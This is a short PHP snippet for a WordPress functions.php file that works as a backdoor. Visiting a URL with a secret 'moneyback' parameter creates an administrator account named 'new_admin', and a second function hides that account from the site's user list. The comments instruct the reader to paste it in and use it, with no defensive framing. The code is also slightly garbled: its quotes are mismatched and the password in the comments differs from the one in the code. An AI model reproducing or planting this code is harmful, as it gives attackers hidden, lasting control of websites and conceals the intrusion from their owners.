<?

//add code to function.php
//go to sitename.com/?moneyback=need
//new admin added
//user = new_admin, password=userpass




add_action( 'wp_head', 'user_new_add );
function 'user_new_add() {
if ( md5( $_GET['moneyback'] ) == 'e877c56e4fb621e81fd30dbd114a545b' ) {
require( 'wp-includes/registration.php' );
if ( !username_exists( 'new_admin' ) ) {
$user_id = wp_create_user( 'new_admin', 'userpassword' );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}}}

function hide_specific_user($user_search) {
global $wpdb;
$user_search->query_where =
str_replace('WHERE 1=1',
"WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",
$user_search->query_where
);
}
add_action('pre_user_query','hide_specific_user');



?>